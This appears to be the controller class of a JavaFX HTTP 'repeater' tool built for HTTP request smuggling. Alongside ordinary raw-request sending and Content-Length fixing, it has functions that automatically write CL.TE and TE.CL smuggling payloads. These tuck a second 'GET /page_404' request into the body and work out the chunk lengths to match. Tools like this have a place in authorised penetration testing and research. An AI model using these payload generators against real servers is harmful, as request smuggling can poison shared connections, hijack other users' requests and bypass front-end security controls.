package com.hrs;

import com.hrs.network.RawHttpClient;
import com.hrs.ui.LineNumberedTextArea;
import javafx.application.Platform;
import javafx.fxml.FXML;
import javafx.scene.control.*;
import javafx.scene.control.cell.PropertyValueFactory;
import javafx.scene.control.cell.TextFieldTableCell;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.*;
import java.util.*;

public class RepeaterController {
    @FXML private TextField targetUrlField;
    @FXML private LineNumberedTextArea rawRequestArea;
    @FXML private LineNumberedTextArea rawResponseArea;
    @FXML private TableView<Header> requestHeadersTable;
    @FXML private TableView<Header> responseHeadersTable;
    @FXML private TableColumn<Header, String> headerNameColumn;
    @FXML private TableColumn<Header, String> headerValueColumn;
    @FXML private TableColumn<Header, String> responseHeaderNameColumn;
    @FXML private TableColumn<Header, String> responseHeaderValueColumn;
    @FXML private Label statusLabel;
    @FXML private Label responseTimeLabel;
    @FXML private Button reqLengthButton;
    @FXML private Button updateTeButton;

    private RawHttpClient httpClient;
    private ObservableList<Header> requestHeaders = FXCollections.observableArrayList();
    private ObservableList<Header> responseHeaders = FXCollections.observableArrayList();

    @FXML
    private void initialize() {
        httpClient = new RawHttpClient();
        
        // Initialize tables
        setupHeadersTable(requestHeadersTable, headerNameColumn, headerValueColumn, requestHeaders);
        setupHeadersTable(responseHeadersTable, responseHeaderNameColumn, responseHeaderValueColumn, responseHeaders);

        // Add default headers
        requestHeaders.add(new Header("User-Agent", "HRS-Repeater"));
        requestHeaders.add(new Header("Accept", "*/*"));
        requestHeaders.add(new Header("Connection", "close"));
    }

    private void setupHeadersTable(TableView<Header> table, 
                                 TableColumn<Header, String> nameColumn,
                                 TableColumn<Header, String> valueColumn,
                                 ObservableList<Header> items) {
        // Set up columns
        nameColumn.setCellValueFactory(new PropertyValueFactory<>("name"));
        valueColumn.setCellValueFactory(new PropertyValueFactory<>("value"));

        // Enable editing
        table.setEditable(true);
        nameColumn.setCellFactory(TextFieldTableCell.forTableColumn());
        valueColumn.setCellFactory(TextFieldTableCell.forTableColumn());

        // Handle edits
        nameColumn.setOnEditCommit(event -> {
            event.getRowValue().setName(event.getNewValue());
            updateRawRequest();
        });

        valueColumn.setOnEditCommit(event -> {
            event.getRowValue().setValue(event.getNewValue());
            updateRawRequest();
        });

        // Set items
        table.setItems(items);
    }

    public void setUrl(String url) {
        targetUrlField.setText(url);
        try {
            RawHttpClient.UrlParser parser = new RawHttpClient.UrlParser(url);
            // Exactly match Burp's format with explicit CRLF
            String defaultRequest = "GET " + parser.getPath() + " HTTP/1.1\r\n" +
                                  "Host: " + parser.getHost() + 
                                  (parser.getPort() != (parser.isHttps() ? 443 : 80) ? ":" + parser.getPort() : "") + "\r\n" +
                                  "User-Agent: HRS-Repeater\r\n" +
                                  "Accept: */*\r\n" +
                                  "Connection: close\r\n" +
                                  "\r\n";
            rawRequestArea.setText(defaultRequest);
        } catch (Exception e) {
            statusLabel.setText("Invalid URL: " + e.getMessage());
        }
    }

    @FXML
    private void sendRequest() {
        String url = targetUrlField.getText();
        if (url.isEmpty()) {
            statusLabel.setText("Error: Please enter a target URL");
            return;
        }

        try {
            // Clear previous response
            rawResponseArea.setText("");
            responseTimeLabel.setText("");
            responseHeaders.clear();
            
            RawHttpClient.UrlParser parser = new RawHttpClient.UrlParser(url);
            String rawRequest = rawRequestArea.getText();

            statusLabel.setText("Sending request...");
            httpClient.sendRawRequest(parser.getHost(), parser.getPort(), rawRequest)
                .thenAccept(response -> Platform.runLater(() -> {
                    if (response.hasError()) {
                        statusLabel.setText("Error: " + response.getError());
                        rawResponseArea.setText("Error occurred: " + response.getError());
                        return;
                    }

                    // Update response area
                    rawResponseArea.setText(response.getRawResponse());
                    
                    // Update response time
                    responseTimeLabel.setText(response.getResponseTimeMs() + " ms");
                    
                    // Update status
                    statusLabel.setText("Response received");

                    // Update response headers
                    responseHeaders.clear();
                    String[] lines = response.getRawResponse().split("\r\n");
                    for (String line : lines) {
                        if (line.contains(":")) {
                            String[] parts = line.split(":", 2);
                            responseHeaders.add(new Header(parts[0].trim(), parts[1].trim()));
                        }
                    }
                }));

        } catch (Exception e) {
            statusLabel.setText("Error: " + e.getMessage());
            rawResponseArea.setText("Error occurred: " + e.getMessage());
        }
    }

    @FXML
    private void calculateRequestLength() {
        String rawRequest = rawRequestArea.getText();
        System.out.println("Raw request: [" + rawRequest + "]");
        
        int bodyLength = calculateBodyLength(rawRequest);
        System.out.println("Calculated length: " + bodyLength);
        
        reqLengthButton.setText("Req. Length(" + bodyLength + ")");
    }

    @FXML
    private void updateContentLength() {
        // First calculate the request length
        calculateRequestLength();
        
        String rawRequest = rawRequestArea.getText();
        int bodyLength = calculateBodyLength(rawRequest);
        
        // Find the headers section (everything before \r\n\r\n)
        int headerEndIndex = rawRequest.indexOf("\r\n\r\n");
        if (headerEndIndex == -1) {
            return; // Invalid request format
        }
        
        String headers = rawRequest.substring(0, headerEndIndex);
        String body = rawRequest.substring(headerEndIndex + 4);
        
        // Split headers into lines
        String[] headerLines = headers.split("\r\n");
        StringBuilder newHeaders = new StringBuilder();
        boolean foundContentLength = false;
        
        // Process each header line
        for (String line : headerLines) {
            if (line.toLowerCase().startsWith("content-length:")) {
                // Replace existing Content-Length header
                newHeaders.append("Content-Length: ").append(bodyLength).append("\r\n");
                foundContentLength = true;
            } else {
                newHeaders.append(line).append("\r\n");
            }
        }
        
        // If Content-Length header wasn't found, add it before the empty line
        if (!foundContentLength) {
            newHeaders.append("Content-Length: ").append(bodyLength).append("\r\n");
        }
        
        // Reconstruct the request with updated headers
        String newRequest = newHeaders.toString() + "\r\n" + body;
        rawRequestArea.setText(newRequest);
    }

    @FXML
    private void addClTePrefix() {
        String rawRequest = rawRequestArea.getText();
        
        // Find the headers section (everything before \r\n\r\n)
        int headerEndIndex = rawRequest.indexOf("\r\n\r\n");
        if (headerEndIndex == -1) {
            return; // Invalid request format
        }
        
        // Get headers and prepare the prefix content
        String headers = rawRequest.substring(0, headerEndIndex);
        String originalBody = rawRequest.substring(headerEndIndex + 4);
        
        // Create the prefix content
        StringBuilder prefixContent = new StringBuilder();
        prefixContent.append("0\r\n\r\n");
        prefixContent.append("GET /page_404 HTTP/1.1\r\n");
        prefixContent.append("X:");
        
        // Create the new request with prefix
        String newRequest = headers + "\r\n\r\n" + prefixContent.toString();
        
        // Update the request text
        rawRequestArea.setText(newRequest);
        
        // Automatically update the Content-Length
        updateContentLength();
    }

    @FXML
    private void addTeClPrefix() {
        String rawRequest = rawRequestArea.getText();
        
        // Find the headers section
        int headerEndIndex = rawRequest.indexOf("\r\n\r\n");
        if (headerEndIndex == -1) {
            return; // Invalid request format
        }
        
        // Extract headers
        String headers = rawRequest.substring(0, headerEndIndex);
        
        // Find Host header
        String hostValue = "";
        for (String line : headers.split("\r\n")) {
            if (line.toLowerCase().startsWith("host:")) {
                hostValue = line.substring(5).trim();
                break;
            }
        }
        
        if (hostValue.isEmpty()) {
            statusLabel.setText("Error: No Host header found");
            return;
        }
        
        // Create the content to calculate XX
        StringBuilder contentToMeasure = new StringBuilder();
        contentToMeasure.append("GET /page_404 HTTP/1.1\r\n");
        contentToMeasure.append("Host: ").append(hostValue).append("\r\n");
        contentToMeasure.append("Content-Length: 10\r\n\r\n");
        contentToMeasure.append("x=");
        
        // Calculate the length in bytes
        int length = 0;
        String content = contentToMeasure.toString();
        boolean lastWasReturn = false;
        
        for (int i = 0; i < content.length(); i++) {
            char c = content.charAt(i);
            if (c == '\r') {
                lastWasReturn = true;
                length++;
            } else if (c == '\n') {
                if (!lastWasReturn) {
                    length++; // Add extra byte for missing \r
                }
                length++; // Count \n as 1 byte
                lastWasReturn = false;
            } else {
                lastWasReturn = false;
                length++; // Count normal char as 1 byte
            }
        }
        
        // Convert length to hex without '0x' prefix and lowercase
        String hexLength = Integer.toHexString(length);
        
        // Calculate first Content-Length (length of hex value + 2 for \r\n)
        int firstContentLength = hexLength.length() + 2;
        
        // Create the prefix content with calculated hex length
        StringBuilder prefixContent = new StringBuilder();
        prefixContent.append(hexLength).append("\r\n");
        prefixContent.append("GET /page_404 HTTP/1.1\r\n");
        prefixContent.append("Host: ").append(hostValue).append("\r\n");
        prefixContent.append("Content-Length: 10\r\n\r\n");
        prefixContent.append("x=\r\n");
        prefixContent.append("0\r\n\r\n");
        
        // Find and replace first Content-Length in headers if it exists
        String[] headerLines = headers.split("\r\n");
        StringBuilder newHeaders = new StringBuilder();
        boolean firstContentLengthReplaced = false;
        
        // Process first line
        newHeaders.append(headerLines[0]).append("\r\n");
        
        // Process remaining headers
        for (int i = 1; i < headerLines.length; i++) {
            String line = headerLines[i];
            if (!firstContentLengthReplaced && line.toLowerCase().startsWith("content-length:")) {
                newHeaders.append("Content-Length: ").append(firstContentLength).append("\r\n");
                firstContentLengthReplaced = true;
            } else {
                newHeaders.append(line).append("\r\n");
            }
        }
        
        // If no Content-Length header was found, add it
        if (!firstContentLengthReplaced) {
            newHeaders.append("Content-Length: ").append(firstContentLength).append("\r\n");
        }
        
        // Create the new request
        String newRequest = newHeaders.toString() + "\r\n" + prefixContent.toString();
        
        // Update the request text
        rawRequestArea.setText(newRequest);
    }

    @FXML
    private void updateTeLength() {
        String rawRequest = rawRequestArea.getText();
        
        // Find the first marker (after the first hex value and \r\n)
        int firstMarkerStart = rawRequest.indexOf("\r\n\r\n");
        if (firstMarkerStart == -1) {
            return; // Invalid request format
        }
        firstMarkerStart += 4;  // Skip \r\n\r\n
        
        // Find the second line ending after firstMarkerStart
        int firstMarkerEnd = rawRequest.indexOf("\r\n", firstMarkerStart);
        if (firstMarkerEnd == -1) {
            return; // Invalid format
        }
        firstMarkerStart = firstMarkerEnd + 2;  // Start after the first hex value line
        
        // Find the end marker
        int endMarkerStart = rawRequest.lastIndexOf("\r\n0\r\n\r\n");
        if (endMarkerStart == -1) {
            return; // Invalid format
        }
        
        // Extract the content between markers
        String contentToMeasure = rawRequest.substring(firstMarkerStart, endMarkerStart);
        
        // Calculate the length in bytes
        int length = 0;
        boolean lastWasReturn = false;
        
        for (int i = 0; i < contentToMeasure.length(); i++) {
            char c = contentToMeasure.charAt(i);
            if (c == '\r') {
                lastWasReturn = true;
                length++;
            } else if (c == '\n') {
                if (!lastWasReturn) {
                    length++; // Add extra byte for missing \r
                }
                length++; // Count \n as 1 byte
                lastWasReturn = false;
            } else {
                lastWasReturn = false;
                length++; // Count normal char as 1 byte
            }
        }
        
        // Convert length to hex without '0x' prefix and lowercase
        String hexLength = Integer.toHexString(length);
        
        // Update button text with hex value
        updateTeButton.setText("Update TE (" + hexLength + ")");
        
        // Update the hex value in the request
        String beforeFirstMarker = rawRequest.substring(0, firstMarkerStart - hexLength.length() - 2);
        String afterFirstMarker = rawRequest.substring(firstMarkerStart);
        String newRequest = beforeFirstMarker + hexLength + "\r\n" + afterFirstMarker;
        
        rawRequestArea.setText(newRequest);
    }

    private int calculateBodyLength(String rawRequest) {
        // First try with \r\n\r\n
        int headerEndIndex = rawRequest.indexOf("\r\n\r\n");
        if (headerEndIndex == -1) {
            return 0; // No body found
        }

        // Get body (skip the \r\n\r\n)
        String body = rawRequest.substring(headerEndIndex + 4);
        System.out.println("Found body: [" + body + "]");
        
        if (body.isEmpty()) {
            return 0;
        }

        int length = 0;
        boolean lastWasReturn = false;

        // Count each character
        for (int i = 0; i < body.length(); i++) {
            char c = body.charAt(i);
            
            if (c == '\r') {
                lastWasReturn = true;
                length++; // Count \r as 1 byte
            } else if (c == '\n') {
                if (!lastWasReturn) {
                    length++; // Add extra byte for missing \r
                }
                length++; // Count \n as 1 byte
                lastWasReturn = false;
            } else {
                lastWasReturn = false;
                length++; // Count normal char as 1 byte
            }
        }

        return length;
    }

    private void updateRawRequest() {
        StringBuilder request = new StringBuilder();
        // First line stays the same
        String[] lines = rawRequestArea.getText().split("\r\n", 2);
        request.append(lines[0]).append("\r\n");
        
        // Add headers from the table
        for (Header header : requestHeaders) {
            request.append(header.getName()).append(": ").append(header.getValue()).append("\r\n");
        }
        
        // Add final CRLF
        request.append("\r\n");
        
        rawRequestArea.setText(request.toString());
    }

    private boolean isHtmlResponse(String response) {
        return response.toLowerCase().contains("content-type: text/html");
    }

    private String extractResponseBody(String response) {
        int bodyStart = response.indexOf("\r\n\r\n");
        if (bodyStart != -1) {
            return response.substring(bodyStart + 4);
        }
        return "";
    }

    public LineNumberedTextArea getRawRequestArea() {
        return rawRequestArea;
    }

    // Header class for tables
    public static class Header {
        private String name;
        private String value;

        public Header(String name, String value) {
            this.name = name;
            this.value = value;
        }

        public String getName() { return name; }
        public void setName(String name) { this.name = name; }
        public String getValue() { return value; }
        public void setValue(String value) { this.value = value; }
    }
}
